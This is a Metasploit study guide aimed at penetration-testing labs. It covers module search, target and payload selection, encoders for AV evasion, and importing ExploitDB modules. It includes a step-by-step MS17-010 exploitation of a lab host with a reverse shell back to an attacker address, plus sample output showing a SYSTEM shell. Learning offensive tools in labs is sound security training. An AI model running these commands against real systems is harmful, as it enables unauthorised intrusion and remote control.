# Metasploit Framework

## Overview

Metasploit modules are prepared scripts with specific purposes and corresponding functions that have been developed and tested. The exploit category consists of proof-of-concept (POCs) that can be used to exploit existing vulnerabilities in an automated manner.

**Important**: Metasploit should be considered a **support tool**, not a substitute for manual skills. Failed exploits don't disprove vulnerabilities - they may require customization for specific targets.

## Module Structure

### Syntax
```
<No.> <type>/<os>/<service>/<name>

Example:
794   exploit/windows/ftp/scriptftp_list
```

### Components

| Component | Description | Example |
|-----------|-------------|---------|
| **No.** | Index number for selection | 794 |
| **Type** | Module category | exploit |
| **OS** | Target operating system | windows |
| **Service** | Vulnerable service/activity | ftp |
| **Name** | Specific action/exploit | scriptftp_list |

## Module Types

### Interactable Modules (can use `use <no.>`)
| Type | Description |
|------|-------------|
| **Auxiliary** | Scanning, fuzzing, sniffing, admin capabilities |
| **Exploits** | Exploit vulnerabilities for payload delivery |
| **Post** | Post-exploitation modules (gather info, pivot) |

### Supporting Modules
| Type | Description |
|------|-------------|
| **Encoders** | Ensure payload integrity during delivery |
| **NOPs** | Keep payload sizes consistent |
| **Payloads** | Code that runs remotely and calls back |
| **Plugins** | Additional scripts for msfconsole |

## Searching Modules

### Basic Search
```bash
msf6 > search <keyword>
msf6 > search eternalromance
msf6 > search ms17_010
```

### Advanced Search Options
```bash
# Search by type
msf6 > search type:exploit

# Search by CVE
msf6 > search cve:2021

# Search by platform
msf6 > search platform:windows

# Combined search
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

### Search Keywords
| Keyword | Description | Example |
|---------|-------------|---------|
| `type:` | Module type | `type:exploit` |
| `platform:` | Target platform | `platform:windows` |
| `cve:` | CVE identifier | `cve:2021` |
| `rank:` | Exploitability rank | `rank:excellent` |
| `port:` | Target port | `port:445` |
| `author:` | Module author | `author:rapid7` |

## Module Selection & Usage

### 1. Select Module
```bash
msf6 > use <number>
msf6 > use 0
# or
msf6 > use exploit/windows/smb/ms17_010_psexec
```

### 2. Check Options
```bash
msf6 exploit(windows/smb/ms17_010_psexec) > options
msf6 exploit(windows/smb/ms17_010_psexec) > info
```

### 3. Configure Required Options
```bash
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.14.15
```

### 4. Global Settings (persistent across modules)
```bash
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15
```

### 5. Execute
```bash
msf6 exploit(windows/smb/ms17_010_psexec) > run
# or
msf6 exploit(windows/smb/ms17_010_psexec) > exploit
```

## Quick Example: EternalRomance

### Target Discovery
```bash
nmap -sV 10.10.10.40
# Found: 445/tcp open microsoft-ds Microsoft Windows 7-10
```

### Exploitation Workflow
```bash
# 1. Search for exploit
msf6 > search ms17_010

# 2. Select module
msf6 > use 0

# 3. Configure
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.14.15

# 4. Execute
msf6 exploit(windows/smb/ms17_010_psexec) > run
```

### Expected Output
```
[*] Started reverse TCP handler on 10.10.14.15:4444 
[+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010!
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[*] Command shell session 1 opened
meterpreter > shell
C:\Windows\system32> whoami
nt authority\system
```

## Targets

### What are Targets?
Targets are unique operating system identifiers taken from specific OS versions. They adapt the selected exploit module to run on a particular version of the operating system.

### Target Management
```bash
# Show available targets (must be inside a module)
msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

# Show targets from root menu (will show error)
msf6 > show targets
[-] No exploit module selected.
```

### Example: IE Exploit Targets
```bash
msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:
   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7
```

### Target Selection
```bash
# Use automatic target detection (default)
msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 0

# Set specific target if you know the version
msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 6
target => 6
```

### Target Considerations
- **Automatic**: Metasploit performs service detection before attack
- **Specific**: Use when you know exact OS/software versions
- **Addresses**: Targets differ by return addresses, service packs, OS versions
- **Languages**: Language packs can change memory addresses
- **Verification**: Always verify target compatibility before exploitation

## Payloads

### What are Payloads?
Payloads are modules that work with exploits to typically return a shell to the attacker. They are sent together with the exploit to establish a foothold on the target system.

### Payload Types

#### Singles
- **Self-contained** payloads with exploit + complete shellcode
- **Stable** but can be large in size
- **Example**: `windows/shell_bind_tcp` (no stage, indicated by single `/`)

#### Stagers & Stages
- **Stagers**: Small, reliable, establish network connection
- **Stages**: Downloaded by stagers, provide advanced features
- **Example**: `windows/shell/bind_tcp` (staged, indicated by double `/`)

#### Meterpreter
- **Advanced payload** using DLL injection
- **Memory-resident** - leaves no traces on disk
- **Feature-rich**: keystroke capture, screenshots, pivoting
- **Example**: `windows/x64/meterpreter/reverse_tcp`

### Payload Management

#### List Available Payloads
```bash
# Show all payloads
msf6 > show payloads

# Search for specific payloads
msf6 exploit(windows/smb/ms17_010_psexec) > grep meterpreter show payloads
msf6 exploit(windows/smb/ms17_010_psexec) > grep meterpreter grep reverse_tcp show payloads
```

#### Select Payload
```bash
# Set payload by number
msf6 exploit(windows/smb/ms17_010_psexec) > set payload 15

# Set payload by name
msf6 exploit(windows/smb/ms17_010_psexec) > set payload windows/x64/meterpreter/reverse_tcp
```

### Common Payload Examples

#### Windows Payloads
| Payload | Description |
|---------|-------------|
| `windows/x64/shell_reverse_tcp` | Simple reverse shell |
| `windows/x64/meterpreter/reverse_tcp` | Meterpreter reverse shell |
| `windows/x64/meterpreter/reverse_https` | Meterpreter over HTTPS |
| `windows/x64/exec` | Execute arbitrary command |

#### Connection Types
| Type | Description | Use Case |
|------|-------------|----------|
| **reverse_tcp** | Target connects back to attacker | Bypasses firewalls |
| **bind_tcp** | Attacker connects to target | Direct connection |
| **reverse_https** | HTTPS tunnel for stealth | Evades detection |

### Payload Configuration
```bash
# Required payload options
msf6 exploit(windows/smb/ms17_010_psexec) > show options

Payload options (windows/x64/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port
```

## Database Integration (Enterprise Feature)

### Overview
Metasploit supports PostgreSQL integration for:
- **Multi-host engagements** tracking
- **Scan result** organization  
- **Credential** management
- **Team collaboration**

### Basic Setup
```bash
sudo msfdb init       # Initialize database
msfconsole             # Connect automatically
db_status              # Check connection
```

### Key Commands
```bash
workspace -a ProjectX  # Create workspace
db_nmap -sV target     # Integrated Nmap scanning
hosts                  # List discovered hosts
services               # List services found
creds                  # View gathered credentials
db_export -f xml backup.xml  # Export results
```

### When to Use
- **Large networks** (10+ hosts)
- **Team assessments** with shared data
- **Long-term campaigns** requiring tracking
- **Client reporting** with organized results

**Note**: Not typically needed for CPTS lab scenarios or single-target assessments.

## Essential Commands

### Module Management
```bash
help search          # Search help
info                 # Module information
options              # Show module options
set <option> <value> # Set option value
setg <option> <value># Set global option
unset <option>       # Unset option
```

### Session Management
```bash
sessions             # List active sessions
sessions -i <id>     # Interact with session
sessions -k <id>     # Kill session
background           # Background current session
```

### Payload & Target Management
```bash
show payloads        # List available payloads
set payload <name>   # Set specific payload
show targets         # Show available targets
set target <id>      # Set target (0=Automatic)
```

## Best Practices

1. **Always verify targets** before exploitation
2. **Use auxiliary scanners** to confirm vulnerabilities
3. **Set appropriate payloads** for target architecture
4. **Test exploits** in lab environments first
5. **Document attempts** and customizations needed
6. **Use global settings** for efficiency during engagements

## Common Workflow

1. **Reconnaissance**: Scan target ports and services
2. **Search**: Find relevant modules using keywords
3. **Select**: Choose appropriate exploit module
4. **Configure**: Set required options (RHOSTS, LHOST, etc.)
5. **Target**: Set specific target or use automatic detection
6. **Payload**: Select appropriate payload (shell, meterpreter, etc.)
7. **Verify**: Check options and module info
8. **Execute**: Run the exploit
9. **Post-exploit**: Use meterpreter or shell for further access

This framework provides systematic approach to exploitation while maintaining the flexibility needed for diverse penetration testing scenarios. 

## Encoders (Legacy AV Evasion)

### Overview
Encoders modify payloads to:
- Make compatible with different architectures (x86, x64)
- Remove bad characters from shellcode
- Historically: evade antivirus detection

### Current Status
- **Shikata Ga Nai** was once highly effective
- **Modern AV** systems detect most encoded payloads
- **Limited effectiveness** for evasion (51/68 detection rate)

### Basic Commands
```bash
show encoders                    # List compatible encoders
set encoder x86/shikata_ga_nai  # Set encoder
```

### Modern Approach
See `payloads.md` for current AV evasion techniques

## Module Management (Custom Modules)

### Importing Modules from ExploitDB

#### Find MSF Modules
```bash
# Search ExploitDB for MSF modules
searchsploit -t <service> --exclude=".py"
searchsploit nagios3 --exclude=".py"

# Look for .rb files (Ruby/Metasploit modules)
searchsploit -t <service> | grep "\.rb"
```

#### Install Custom Module
```bash
# Copy to appropriate directory
cp ~/Downloads/exploit.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/custom_exploit.rb

# Launch with module path
msfconsole -m /usr/share/metasploit-framework/modules/

# OR reload in running session
msf6 > reload_all
msf6 > use exploit/unix/webapp/custom_exploit
```

### Directory Structure
```
/usr/share/metasploit-framework/modules/
├── exploits/
│   ├── windows/
│   ├── linux/
│   └── unix/webapp/
├── auxiliary/
├── post/
└── payloads/
```

### Naming Convention
- **snake_case**: Use underscores, not dashes
- **Alphanumeric**: No special characters
- **Descriptive**: Clear purpose indication

**Examples:**
- ✅ `nagios3_command_injection.rb`
- ✅ `bludit_auth_bypass.rb`
- ❌ `nagios-exploit.rb` (dashes)
- ❌ `exploit@test.rb` (special chars)

### Module Installation Process
```bash
# 1. Download module
wget https://www.exploit-db.com/raw/9861 -O nagios3_exploit.rb

# 2. Place in correct directory
sudo cp nagios3_exploit.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb

# 3. Load in msfconsole
msf6 > reload_all
msf6 > search nagios3
msf6 > use exploit/unix/webapp/nagios3_command_injection
```

### Troubleshooting
- **Module not found**: Check file path and naming
- **Load errors**: Verify Ruby syntax and dependencies
- **Permission issues**: Use sudo for system directories

**Note**: For advanced module development, see [Metasploit Documentation](https://docs.metasploit.com/)

This framework provides systematic approach to exploitation while maintaining the flexibility needed for diverse penetration testing scenarios. 